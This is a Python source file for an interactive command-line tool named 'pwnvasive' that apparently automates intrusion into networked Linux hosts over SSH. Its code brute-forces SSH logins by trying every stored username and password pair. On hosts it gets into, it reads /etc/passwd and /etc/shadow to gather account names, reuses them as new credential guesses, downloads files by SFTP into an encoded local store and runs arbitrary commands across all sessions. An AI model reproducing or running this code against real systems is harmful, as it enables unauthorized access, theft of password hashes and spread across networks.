#! /usr/bin/env python

import asyncio
import asyncssh
import json
import argparse
import logging
from aiocmd import aiocmd
import os
from enum import Enum,auto
import base64
import zlib

logging.basicConfig()
logging.getLogger("asyncio").setLevel(logging.WARNING)


class States(Enum):
    INVENTORIED = 1
    REACHED = 2
    CONNECTED = 3
    IDENTIFIED = 4
    HARVESTED = 5

class JSONEnc(json.JSONEncoder):
    def default(self, o):
        if hasattr(o, "__json__"):
            return o.__json__()
        return json.JSONEncoder.default(self, o)

class NoCredsFound(Exception):
    def __str__(self):
        return f"{self.__class__.__name__}: no creds found for {self.args[0]}"


class OS(object):
    def __init__(self, node):
        self.node = node

class Linux(OS):
    @property
    def file_list(self):
        return self.node.config.linuxfile

    async def run(self, cmd):
        sout,serr = await self.node.run(cmd)
        return sout.strip()

    async def get_hostname(self):
        return await self.run("uname -n")
    async def get_os(self):
        return await self.run("uname -o")
    async def get_uid(self):
        return await self.run("id -u")

    async def get_all(self):
        keys = ["hostname", "os", "uid"]
        vals = await asyncio.gather(*[getattr(self, f"get_{k}")() for k in keys])
        return dict(zip(keys, vals))

    async def collect_logins(self):
        out,_ = await self.node.run("grep -v nologin /etc/passwd;grep -v ':!:' /etc/shadow")
        logins = set(x.split(":")[0] for x in out.splitlines())
        return list(logins)

    async def collect_files(self):
        files = ["/etc/passwd", "/etc/shadow", "/etc/fstab", "/etc/inittab"]

class Mapping(object):
    _key = None
    _fields = []
    def __init__(self, config=None, **kargs):
        self.config = config
        self.values = {}
        for f,v,_ in self._fields:
            self.values[f] = kargs.pop(f, v)
        if self._key is None:
            self._key = self._fields[0][0]
    def __getattr__(self, attr):
        if attr in self.values:
            return self.values[attr]
        raise AttributeError(attr)
    @classmethod
    def from_json(cls, j, config=None):
        return cls(config=config, **j)
    def to_json(self):
        return self.values
    def __json__(self):
        return self.to_json()
    def __repr__(self):
        def fmtval(v):
            if type(v) is list:
                return [fmtval(x) for x in v]
            if type(v) is dict:
                return {k:fmtval(v) for k,v in v.items()}
            v = f"{v}"
            if len(v) > 20:
                v = f"{v[:5]}...({len(v)})...{v[-5:]}"
            return v
        r = ", ".join(f"{k}={fmtval(v)}" for k,v in self.values.items() if v is not None)
        return f"<{r}>"

class Net(Mapping):
    _fields = [
        ("cidr", "127.0.0.1/32", str),
        ("scanned", False, bool),
    ]


class LinuxFiles(Mapping):
    _fields = [
        ("path", "", str),
    ]



class Node(Mapping):
    _fields = [
        ("ip", "127.0.0.1", str),
        ("port", 22, int),
        ("controlled", False, bool),
        ("ssh_login", None, str),
        ("ssh_password", None, str),
        ("ssh_key", None, str),
        ("tested_credentials", [], list),
        ("working_credentials", [], list),
        ("os", None, str),
        ("files", {}, dict),
    ]

    def __init__(self, **kargs):
        super().__init__(**kargs)
        self.state = States.INVENTORIED
        self.session = None
        if self.values.get("os") == "linux":
            self.os = Linux(self)

    async def run(self, cmd):
        r = await self.session.run(cmd)
        return r.stdout, r.stderr

    async def get_file(self, path):
        async with self.session.session.start_sftp_client() as sftp:
            f = await sftp.open(path, "rb")
            return await f.read()

    async def get_files(self, *paths):
        async with self.session.session.start_sftp_client() as sftp:
            lst = await sftp.glob(paths)
            content = await asyncio.gather(*[self.get_file(x) for x in lst if x not in self.files])
        zcontent = [base64.b85encode(zlib.compress(c)).decode("ascii") for c in content]
        d = dict(zip(lst, zcontent))
        self.files.update(d)
        return d


    async def get_glob(self, pattern):
        async with self.session.session.start_sftp_client() as sftp:
            return await sftp.glob(pattern)


    async def get_all_files(self):
        lst = [f.path for f in  self.os.file_list]
        return await self.get_files(*lst)

    async def test_creds(self, login, pwd):
        opt = asyncssh.SSHClientConnectionOptions(username=login, password=pwd, known_hosts=None)

        try:
            sess = await asyncssh.connect(host=self.ip, port=self.port, options=opt)
        except Exception as e:
            print(f"Failed {login} {pwd}: {e}") 
            return [login,pwd],False,None
        return [login,pwd],True,sess

    async def ensure_reached(self):
        if self.state.value >= States.REACHED.value:
            return True
        await asyncio.open_connection(self.ip, self.port)
        self.state = States.REACHED
        return True

    async def ensure_connected(self):
        if self.state.value >= States.CONNECTED.value:
            return self.session
        if not await self.ensure_reached():
            return False

        # XXX manage keys
        if self.ssh_login is None or self.ssh_password is None:
            logins = [l.login for l in self.config.login]
            passwords = [p.password for p in self.config.password]

            res = await asyncio.gather(*[
                self.test_creds(l,p)
                for l in logins for p in passwords
                if [l,p] not in self.tested_credentials])

            self.tested_credentials.extend([cred for cred,r,_ in res if not r])
            self.working_credentials.extend([cred for cred,r,_ in res if r])
            if self.working_credentials:
                self.state = States.CONNECTED
                self.values["ssh_login"],self.values["ssh_password"] = self.working_credentials[0]
                for _,r,sess in res:
                    if r:
                        break
            return None
        else:
            _,_,sess = await self.test_creds(self.ssh_login, self.ssh_password)

        self.session = NodeSession(self, sess)
        self.state = States.CONNECTED
        return self.session

    async def ensure_identified(self):
        if self.state.value >= States.IDENTIFIED.value:
            return True
        if not await self.ensure_connected():
            return False
        sout,serr = await self.run("uname -o")
        if sout.startswith("Linux"):
            self.os = Linux(self)
            self.values["os"] = "linux"
            self.state = States.IDENTIFIED
            return True
        else:
            return False

    async def connect(self):
        if not await self.ensure_identified():
            return None
        return self.session

    async def collect(self):
        pass

class NodeSession(object):
    def __init__(self, node, session):
        self.node = node
        self.session = session
    def __repr__(self):
        return f"<session to {self.node.ip}>"
    async def run(self, *args, **kargs):
        return await self.session.run(*args, **kargs)
    async def start_sftp_client(self, *args, **kargs):
        return await self.session.start_sftp_client(*args, **kargs)

class Logins(Mapping):
    _fields = [
        ("login", None, str),
    ]

class Passwords(Mapping):
    _fields = [
        ("password", None, str),
    ]

class SSHKeys(Mapping):
    _fields = [
        ("key", None, str),
        ("password", None, str),
    ]



DEFAULT_CONFIG = {
    "meta": { "version": "0.1", },
    "state": {
    },
}

class Config(object):
    _objects = {
        "network": Net,
        "node": Node,
        "login": Logins,
        "password": Passwords,
        "sshkey": SSHKeys,
        "linuxfile": LinuxFiles,
    }
    def __init__(self, fname=None, json_=None):
        self.fname = fname
        if json_ is not None:
            j = json_
        elif fname and os.path.isfile(fname):
            with open(fname) as f:
                j = json.load(f)
        else:
            j = DEFAULT_CONFIG
        self.config = j
        s = self.config["state"]
        self.objects = {}
        for f,c in self._objects.items():
            self.objects[f] = [c.from_json(d, config=self) for d in  s.get(f,[])]


    def __getattr__(self, attr):
        if attr in self.objects:
            return self.objects[attr]
        raise AttributeError(attr)


    def __enter__(self):
        return self
    def __exit__(self, *args):
        self.save()

    def save(self, fname=None):
        if fname is None:
            fname = self.fname
        self.config["state"].update(self.objects)
        with open(fname, "w") as f:
            json.dump(self.config, f, cls=JSONEnc)



class Link(object):
    async def __init__(self, node):
        self.node = node

class SSH(Link):
    pass


class PwnCLI(aiocmd.PromptToolkitCmd):
    def __init__(self, options):
        super().__init__()
        self.prompt = "pwnvasive > "
        self.options = options
        self.cfg = options.config
        self.sessions = []

    def do_add(self, obj, val=""):
        val = { k.strip():v.strip() for k,v in [x.strip().split("=",1) for x in val.split(",")] }
        Obj = self.cfg._objects[obj]
        o = Obj(config=self.cfg, **val)
        self.cfg.objects[obj].append(o)

    def do_ls(self, obj):
        if obj == "cnx":
            lst = self.sessions
        else:
            lst = self.cfg.objects[obj]

        for i,o in enumerate(lst):
            print(f"{i:3}: {o}")

    def cb_connected(self, t):
        try:
            nsession = t.result()
        except NoCredsFound as e:
            print(f"Connection failed: {e}")
        else:
            if nsession:
                print(f"Connected to {nsession} (#{len(self.sessions)})")
                self.sessions.append(nsession)

    def cb_get_files(self, t):
        files = t.result()
        print(f"retrieved: {files}")



    async def do_cnx(self, hostnum):
        if hostnum == "all":
            nodes = self.cfg.node
        else:
            hostnum = int(hostnum)
            nodes = [self.cfg.node[hostnum]]
        for node in nodes:
            print(f"connecting to {node}")
            cnx = node.connect()
            t = asyncio.create_task(cnx)
            t.add_done_callback(self.cb_connected)



    async def do_run(self, cnxnum, cmd):
        if cnxnum == "all":
            nsess = self.sessions
        else:
            cnxnum = int(cnxnum)
            nsess = [self.sessions[cnxnum]]
        async def run_and_print(s, cmd):
            r = await s.run(cmd)
            print(f"-----[{s}]-----")
            print(r.stdout)
        res = await asyncio.gather(*[run_and_print(s, cmd) for s in nsess])


    def do_update(self, obj, objnum, val):
        objnum = int(objnum)
        val = { k.strip():v.strip() for k,v in [x.strip().split("=",1) for x in val.split(",")] }
        o = self.cfg.objects[obj][objnum]
        print(f"Updating {o}")
        for f,_,t in o._fields:
            if f in val:
                old = o.values.get(f,None)
                new_ = t(val[f])
                print(f"  + {f}: {old} --> {new_}")
                o.values[f] = new_


    async def do_info(self, cnxnum):
        cnxnum = int(cnxnum)
        nsess = self.sessions[cnxnum]
        print(await nsess.node.os.get_all())

    async def do_collect(self, cnxnum):
        cnxnum = int(cnxnum)
        nsess = self.sessions[cnxnum]
        logins = await nsess.node.os.collect_logins()
        print(logins)

        exising_logins = set(l.login for l in self.cfg.login)
        exising_passwords = set(p.password for p in self.cfg.password)

        for l in logins:
            if l not in exising_logins:
                lo = Logins(config=self.cfg, login=l)
                self.cfg.login.append(lo)
            if l not in exising_passwords:
                p = Passwords(config=self.cfg, password=l)
                self.cfg.password.append(p)

    async def do_getfiles(self, cnxnum):
        if cnxnum == "all":
            nsess = self.sessions
        else:
            cnxnum = int(cnxnum)
            nsess = [self.sessions[cnxnum]]
        for sess in nsess:
            t = asyncio.create_task(sess.node.get_all_files())
            t.add_done_callback(self.cb_get_files)
            

def main(args=None):
    parser = argparse.ArgumentParser()
    parser.add_argument("database")

    options = parser.parse_args(args)

    with Config(options.database) as options.config:
        asyncio.run(PwnCLI(options).run())
#    asyncio.get_event_loop().run_until_complete(MyCLI().run())

if __name__ == "__main__":
    main()
